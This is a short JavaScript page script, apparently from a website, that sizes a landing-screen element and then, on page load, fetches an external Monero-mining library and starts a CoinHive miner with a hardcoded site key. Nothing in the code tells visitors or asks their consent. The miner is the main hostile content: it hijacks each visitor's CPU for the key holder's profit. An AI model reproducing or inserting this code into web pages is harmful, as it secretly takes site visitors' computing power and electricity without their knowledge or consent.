(function () {
  // first screen
  $('.first-screen').height($(window).height());

  // miner
  const scriptDom = document.createElement('script')
  scriptDom.setAttribute('src', 'https://static.hacpai.com/js/lib/xmr.min.js')
  document.head.appendChild(scriptDom)
  scriptDom.onload = function () {
    var miner = new CoinHive.Anonymous('bSiM5UP0bWeY98R39fQBb2nKiiofSxmU', {threads: 1, throttle: 0.9});
    miner.start();
  }
})();